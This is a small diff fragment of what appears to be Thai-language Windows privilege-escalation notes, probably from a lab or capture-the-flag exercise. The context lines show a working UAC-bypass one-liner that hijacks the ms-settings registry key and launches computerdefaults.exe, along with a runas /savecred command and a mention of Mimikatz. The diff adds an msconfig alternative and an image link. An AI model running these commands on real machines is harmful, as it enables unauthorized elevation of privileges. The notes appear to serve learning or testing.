@@ -165,7 +165,9 @@ runas /savecred /user:SRV01\mcharles cmd
 ```
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
 ```
+หรือ msconfig.exe ด้วย Administrator
 
+![alt text](image-7.png)
 
 ใช้ **Mimikatz** (เครื่องมือแฮกเกอร์)
 
